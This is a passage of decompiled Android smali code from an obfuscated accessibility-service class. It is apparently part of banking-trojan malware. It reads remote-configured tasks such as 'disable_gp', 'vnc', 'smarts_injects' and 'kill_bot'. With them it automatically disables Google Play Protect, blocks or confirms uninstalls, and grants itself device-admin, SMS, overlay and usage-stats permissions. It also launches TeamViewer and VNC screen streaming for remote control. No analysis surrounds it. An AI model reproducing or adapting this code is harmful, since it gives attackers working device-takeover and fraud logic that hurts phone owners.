
    invoke-static {v2, v3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v2

    const-string v3, "uptime"

    invoke-static {v1, v3, v2}, Lfddo/throw;->for(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Long;)Ljava/lang/Long;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Long;->longValue()J

    move-result-wide v1

    int-to-long v3, v0

    cmp-long v0, v1, v3

    if-gez v0, :cond_0

    return-void

    :cond_0
    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const-string v1, "smarts_injects"

    const-string v2, ""

    invoke-static {v0, v1, v2}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/beginhigh19/p023w;->else(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "com.android.vending"

    invoke-static {v1}, Lcom/beginhigh19/p023w;->fddo(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_1

    iget-object v1, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const-string v3, "acsb_task"

    invoke-static {v1, v3, v2}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "disable_gp"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    return-void

    :cond_1
    new-instance v1, Lfddo/class;

    iget-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-direct {v1, v2}, Lfddo/class;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_2

    invoke-virtual {v1, v0}, Lfddo/class;->try(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_2

    invoke-virtual {v1, v0}, Lfddo/class;->ifdf(Ljava/lang/String;)V

    :cond_2
    return-void
.end method

.method public new()V
    .locals 7

    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const-string v1, "vnc"

    const-string v2, ""

    invoke-static {v0, v1, v2}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    :cond_0
    new-instance v0, Lfddo/else;

    iget-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v3, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "com.teamviewer.quicksupport.market|"

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v4, Lcom/beginhigh19/p023w;->else:Ljava/lang/String;

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x0

    const-string v4, "TEAMVIEWER"

    move-object v1, v0

    invoke-direct/range {v1 .. v6}, Lfddo/else;-><init>(Landroid/content/Context;Lcom/beginhigh19/p023w;Ljava/lang/String;Ljava/lang/String;Z)V

    const-string v1, "teamviewer"

    invoke-virtual {v0, v1}, Lfddo/else;->break(Ljava/lang/String;)Z

    return-void
.end method

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 8

    const-string v0, "vnc_screen"

    const-string v1, ""

    sput-object p0, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    iput-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const-string v3, "vnc"

    invoke-static {v2, v3, v1}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "STREAM_LAYOUT;"

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_2

    iget-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const-string v3, "acsb_task"

    invoke-static {v2, v3, v1}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    new-instance v1, Lfddo/else;

    iget-object v3, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const-string v5, "VNC_SCREEN"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v4, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-virtual {v4}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "|com.android.systemui"

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x0

    move-object v2, v1

    move-object v4, p0

    invoke-direct/range {v2 .. v7}, Lfddo/else;-><init>(Landroid/content/Context;Lcom/beginhigh19/p023w;Ljava/lang/String;Ljava/lang/String;Z)V

    invoke-virtual {v1, v0}, Lfddo/else;->break(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-direct {p0}, Lcom/beginhigh19/p023w;->ifdf()V

    :cond_0
    new-instance v0, Lfddo/const;

    iget-object v1, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v2, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    invoke-direct {v0, v1, v2}, Lfddo/const;-><init>(Landroid/content/Context;Lcom/beginhigh19/p023w;)V

    invoke-virtual {v0, p1}, Lfddo/const;->class(Landroid/view/accessibility/AccessibilityEvent;)V

    sget-object v0, Lfddo/for;->ifdf:Ljava/lang/String;

    const-string v1, "VNCINJ"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-virtual {p0, p1}, Lcom/beginhigh19/p023w;->break(Landroid/view/accessibility/AccessibilityEvent;)Z

    move-result p1

    if-eqz p1, :cond_1

    invoke-virtual {p0}, Lcom/beginhigh19/p023w;->native()V

    :cond_1
    return-void

    :cond_2
    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/beginhigh19/p023w;->fddo(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_3

    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const/4 v1, 0x0

    invoke-static {v0, v1}, Lfddo/goto;->z(Landroid/content/Context;Z)V

    :cond_3
    invoke-virtual {p0, p1}, Lcom/beginhigh19/p023w;->break(Landroid/view/accessibility/AccessibilityEvent;)Z

    move-result v0

    if-nez v0, :cond_4

    return-void

    :cond_4
    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/beginhigh19/p023w;->fddo(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_5

    invoke-virtual {p0}, Lcom/beginhigh19/p023w;->native()V

    invoke-virtual {p0}, Lcom/beginhigh19/p023w;->class()V

    invoke-virtual {p0, p1}, Lcom/beginhigh19/p023w;->while(Landroid/view/accessibility/AccessibilityEvent;)V

    invoke-virtual {p0}, Lcom/beginhigh19/p023w;->try()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_5
    return-void
.end method

.method public onInterrupt()V
    .locals 0

    return-void
.end method

.method public onRebind(Landroid/content/Intent;)V
    .locals 0

    invoke-super {p0, p1}, Landroid/accessibilityservice/AccessibilityService;->onRebind(Landroid/content/Intent;)V

    sput-object p0, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    return-void
.end method

.method protected onServiceConnected()V
    .locals 0

    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onServiceConnected()V

    sput-object p0, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    invoke-virtual {p0}, Lcom/beginhigh19/p023w;->import()V

    return-void
.end method

.method public onUnbind(Landroid/content/Intent;)Z
    .locals 0

    const/4 p1, 0x1

    return p1
.end method

.method public super()V
    .locals 7

    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    const-string v2, "kill_bot"

    invoke-static {v0, v2, v1}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    :cond_0
    new-instance v0, Lfddo/new;

    const/4 v2, 0x0

    iget-object v3, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v4, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    invoke-static {}, Lcom/beginhigh19/p023w;->case()Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    move-object v1, v0

    invoke-direct/range {v1 .. v6}, Lfddo/new;-><init>(ZLandroid/content/Context;Lcom/beginhigh19/p023w;Ljava/lang/String;Lfddo/fddo;)V

    iget-object v1, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-static {v1}, Lfddo/goto;->dfhaefdhadfhdfherh(Landroid/content/Context;)Z

    move-result v1

    iget-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const-string v3, "5caeda4937f6e1f37c0caf3650"

    invoke-static {v3}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    invoke-static {v2, v3, v4}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lfddo/new;->fddo(ZLjava/lang/String;)V

    return-void
.end method

.method public this()Landroid/view/accessibility/AccessibilityNodeInfo;
    .locals 1

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    return-object v0
.end method

.method public throw(Ljava/lang/String;)V
    .locals 8

    invoke-static {}, Lcom/beginhigh19/p023w;->case()Ljava/lang/String;

    move-result-object v0

    const-string v1, "accessibilityinstalled"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_11

    invoke-static {}, Lcom/beginhigh19/p023w;->case()Ljava/lang/String;

    move-result-object v0

    const-string v1, "accessibilitysettings"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    goto/16 :goto_1

    :cond_0
    const-string v0, "disable_gp"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    new-instance v0, Lfddo/else;

    iget-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v3, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    const/4 v6, 0x0

    const-string v4, "DISABLE_GP"

    const-string v5, "com.android.vending|com.google.android.gms"

    move-object v1, v0

    invoke-direct/range {v1 .. v6}, Lfddo/else;-><init>(Landroid/content/Context;Lcom/beginhigh19/p023w;Ljava/lang/String;Ljava/lang/String;Z)V

    iget-object v1, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "gp_step"

    invoke-static {v1, v3, v2}, Lfddo/throw;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    if-nez v1, :cond_1

    const-string v2, "gp_page_settings"

    invoke-virtual {v0, v2}, Lfddo/else;->break(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_1

    iget-object v2, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    invoke-virtual {v2}, Lfddo/fddo;->const()Z

    move-result v2

    if-eqz v2, :cond_1

    add-int/lit8 v1, v1, 0x1

    iget-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-static {v2, v3, v4}, Lfddo/throw;->else(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)V

    :cond_1
    const/4 v2, 0x1

    if-ne v1, v2, :cond_2

    const-string v2, "gp_switches_enabled"

    invoke-virtual {v0, v2}, Lfddo/else;->break(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_2

    iget-object v2, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    invoke-virtual {v2}, Lfddo/fddo;->super()Z

    move-result v2

    if-eqz v2, :cond_2

    add-int/lit8 v1, v1, 0x1

    iget-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-static {v2, v3, v4}, Lfddo/throw;->else(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)V

    :cond_2
    const/4 v2, 0x2

    if-ne v1, v2, :cond_3

    const-string v4, "gp_page_ok"

    invoke-virtual {v0, v4}, Lfddo/else;->break(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_3

    iget-object v4, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    invoke-virtual {v4}, Lfddo/fddo;->final()Z

    move-result v4

    if-eqz v4, :cond_3

    add-int/lit8 v1, v1, 0x1

    iget-object v4, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v4, v3, v5}, Lfddo/throw;->else(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)V

    :cond_3
    if-eq v1, v2, :cond_4

    const-string v1, "gp_switches_disabled"

    invoke-virtual {v0, v1}, Lfddo/else;->break(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_4

    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v1, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    const-string v2, "gp_disabled"

    invoke-static {v0, v2, v1}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    iget-object v0, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    invoke-virtual {v0}, Lfddo/fddo;->public()V

    :cond_4
    const-string v0, "confirm_uninstall"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    new-instance v0, Lfddo/else;

    iget-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v3, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    const/4 v6, 0x0

    const-string v4, "UNINSTALL"

    const-string v5, "com.google.android.packageinstaller|com.android.packageinstaller|com.miui.global.packageinstaller"

    move-object v1, v0

    invoke-direct/range {v1 .. v6}, Lfddo/else;-><init>(Landroid/content/Context;Lcom/beginhigh19/p023w;Ljava/lang/String;Ljava/lang/String;Z)V

    const-string v1, "uninstall_confirm"

    invoke-virtual {v0, v1}, Lfddo/else;->break(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_5

    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const-string v1, "UNINSTALL: confirmed"

    invoke-static {v0, v1}, Lfddo/goto;->g(Landroid/content/Context;Ljava/lang/String;)V

    invoke-direct {p0}, Lcom/beginhigh19/p023w;->ifdf()V

    :cond_5
    const-string v0, "push_admin"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_7

    new-instance v1, Lfddo/else;

    iget-object v3, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v4, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    sget-object v6, Lcom/beginhigh19/p023w;->else:Ljava/lang/String;

    const/4 v7, 0x0

    const-string v5, "PUSH"

    move-object v2, v1

    invoke-direct/range {v2 .. v7}, Lfddo/else;-><init>(Landroid/content/Context;Lcom/beginhigh19/p023w;Ljava/lang/String;Ljava/lang/String;Z)V

    iget-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-static {v2}, Lfddo/goto;->ifdf(Landroid/content/Context;)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_6

    iget-object p1, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    invoke-virtual {p1}, Lfddo/fddo;->public()V

    invoke-direct {p0}, Lcom/beginhigh19/p023w;->ifdf()V

    return-void

    :cond_6
    invoke-virtual {v1, v0}, Lfddo/else;->break(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_7

    iget-object v0, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    invoke-virtual {v0}, Lfddo/fddo;->fddo()V

    :cond_7
    const-string v0, "battery"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_8

    new-instance v0, Lfddo/else;

    iget-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v3, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    sget-object v5, Lcom/beginhigh19/p023w;->else:Ljava/lang/String;

    const/4 v6, 0x0

    const-string v4, "BATTERY"

    move-object v1, v0

    invoke-direct/range {v1 .. v6}, Lfddo/else;-><init>(Landroid/content/Context;Lcom/beginhigh19/p023w;Ljava/lang/String;Ljava/lang/String;Z)V

    const-string v1, "battery_confirm"

    invoke-virtual {v0, v1}, Lfddo/else;->break(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_8

    invoke-direct {p0}, Lcom/beginhigh19/p023w;->ifdf()V

    :cond_8
    const-string v0, "xiaomi_autostart"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_9

    new-instance v1, Lfddo/else;

    iget-object v3, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v4, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    sget-object v6, Lcom/beginhigh19/p023w;->else:Ljava/lang/String;

    const/4 v7, 0x0

    const-string v5, "XIAOMI_AUTOSTART"

    move-object v2, v1

    invoke-direct/range {v2 .. v7}, Lfddo/else;-><init>(Landroid/content/Context;Lcom/beginhigh19/p023w;Ljava/lang/String;Ljava/lang/String;Z)V

    invoke-virtual {v1, v0}, Lfddo/else;->break(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_9

    iget-object v1, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    invoke-virtual {v1}, Lfddo/fddo;->fddo()V

    iget-object v1, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const-string v2, "enabled"

    invoke-static {v1, v0, v2}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-direct {p0}, Lcom/beginhigh19/p023w;->ifdf()V

    :cond_9
    const-string v0, "admin"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_b

    new-instance v0, Lfddo/else;

    iget-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v3, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    sget-object v5, Lcom/beginhigh19/p023w;->else:Ljava/lang/String;

    const/4 v6, 0x0

    const-string v4, "DEVADMIN"

    move-object v1, v0

    invoke-direct/range {v1 .. v6}, Lfddo/else;-><init>(Landroid/content/Context;Lcom/beginhigh19/p023w;Ljava/lang/String;Ljava/lang/String;Z)V

    iget-object v1, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v2, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    const-string v3, "kill_bot"

    invoke-static {v1, v3, v2}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_a

    const-string v1, "devadmin_uninstall"

    invoke-virtual {v0, v1}, Lfddo/else;->break(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_b

    goto :goto_0

    :cond_a
    const-string v1, "devadmin_confirm"

    invoke-virtual {v0, v1}, Lfddo/else;->break(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_b

    :goto_0
    invoke-direct {p0}, Lcom/beginhigh19/p023w;->ifdf()V

    :cond_b
    const-string v0, "sms"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_c

    new-instance v0, Lfddo/else;

    iget-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v3, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    sget-object v5, Lcom/beginhigh19/p023w;->else:Ljava/lang/String;

    const/4 v6, 0x0

    const-string v4, "SMSADMIN"

    move-object v1, v0

    invoke-direct/range {v1 .. v6}, Lfddo/else;-><init>(Landroid/content/Context;Lcom/beginhigh19/p023w;Ljava/lang/String;Ljava/lang/String;Z)V

    const-string v1, "sms_change"

    invoke-virtual {v0, v1}, Lfddo/else;->break(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_c

    invoke-direct {p0}, Lcom/beginhigh19/p023w;->ifdf()V

    :cond_c
    const-string v0, "perms"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_d

    new-instance v0, Lfddo/else;

    iget-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v3, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    sget-object v5, Lcom/beginhigh19/p023w;->else:Ljava/lang/String;

    const/4 v6, 0x0

    const-string v4, "PERMS"

    move-object v1, v0

    invoke-direct/range {v1 .. v6}, Lfddo/else;-><init>(Landroid/content/Context;Lcom/beginhigh19/p023w;Ljava/lang/String;Ljava/lang/String;Z)V

    const-string v1, "perms_confirm"

    invoke-virtual {v0, v1}, Lfddo/else;->break(Ljava/lang/String;)Z

    :cond_d
    const-string v0, "write_settings"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_e

    new-instance v1, Lfddo/else;

    iget-object v3, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v6, Lcom/beginhigh19/p023w;->else:Ljava/lang/String;

    const/4 v7, 0x0

    const-string v5, "WRITE_SETTINGS"

    move-object v2, v1

    move-object v4, p0

    invoke-direct/range {v2 .. v7}, Lfddo/else;-><init>(Landroid/content/Context;Lcom/beginhigh19/p023w;Ljava/lang/String;Ljava/lang/String;Z)V

    invoke-virtual {v1, v0}, Lfddo/else;->break(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_e

    invoke-direct {p0}, Lcom/beginhigh19/p023w;->ifdf()V

    iget-object v0, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    invoke-virtual {v0}, Lfddo/fddo;->fddo()V

    iget-object v0, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    invoke-virtual {v0}, Lfddo/fddo;->public()V

    :cond_e
    const-string v0, "usage_stats"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_f

    new-instance v1, Lfddo/else;

    iget-object v3, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v6, Lcom/beginhigh19/p023w;->else:Ljava/lang/String;

    const/4 v7, 0x0

    const-string v5, "USAGE_STATS"

    move-object v2, v1

    move-object v4, p0

    invoke-direct/range {v2 .. v7}, Lfddo/else;-><init>(Landroid/content/Context;Lcom/beginhigh19/p023w;Ljava/lang/String;Ljava/lang/String;Z)V

    invoke-virtual {v1, v0}, Lfddo/else;->break(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_f

    invoke-direct {p0}, Lcom/beginhigh19/p023w;->ifdf()V

    iget-object v0, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    invoke-virtual {v0}, Lfddo/fddo;->fddo()V

    :cond_f
    const-string v0, "overlay"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_10

    new-instance p1, Lfddo/else;

    iget-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    sget-object v5, Lcom/beginhigh19/p023w;->else:Ljava/lang/String;

    const/4 v6, 0x0

    const-string v4, "OVERLAY"

    move-object v1, p1

    move-object v3, p0

    invoke-direct/range {v1 .. v6}, Lfddo/else;-><init>(Landroid/content/Context;Lcom/beginhigh19/p023w;Ljava/lang/String;Ljava/lang/String;Z)V

    invoke-virtual {p1, v0}, Lfddo/else;->break(Ljava/lang/String;)Z

    move-result p1

    if-eqz p1, :cond_10

    invoke-direct {p0}, Lcom/beginhigh19/p023w;->ifdf()V

    iget-object p1, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    invoke-virtual {p1}, Lfddo/fddo;->fddo()V

    :cond_10
    return-void

    :cond_11
    :goto_1
    iget-object p1, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-static {p1}, Lfddo/goto;->dfhaefdhadfhdfherh(Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_12

    iget-object p1, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    invoke-virtual {p1}, Lfddo/fddo;->fddo()V

    :cond_12
    return-void
.end method

.method public try()V
    .locals 3

    invoke-virtual {p0}, Lcom/beginhigh19/p023w;->this()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    new-instance v0, Lfddo/fddo;

    sget-object v1, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    invoke-direct {v0, v1}, Lfddo/fddo;-><init>(Lcom/beginhigh19/p023w;)V

    iput-object v0, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    iget-object v0, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    const-string v1, "acsb_task"

    const-string v2, ""

    invoke-static {v0, v1, v2}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    iget-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-virtual {v1, v2}, Lfddo/fddo;->throw(Landroid/content/Context;)Z

    move-result v1

    if-nez v1, :cond_1

    iget-object v1, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

    iget-object v2, p0, Lcom/beginhigh19/p023w;->fddo:Landroid/content/Context;

    invoke-virtual {v1, v2}, Lfddo/fddo;->while(Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_2

    :cond_1
    invoke-static {}, Lcom/beginhigh19/p023w;->case()Ljava/lang/String;

    move-result-object v1

    const-string v2, "installedappdetails"

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_2

    iget-object v1, p0, Lcom/beginhigh19/p023w;->new:Lfddo/fddo;

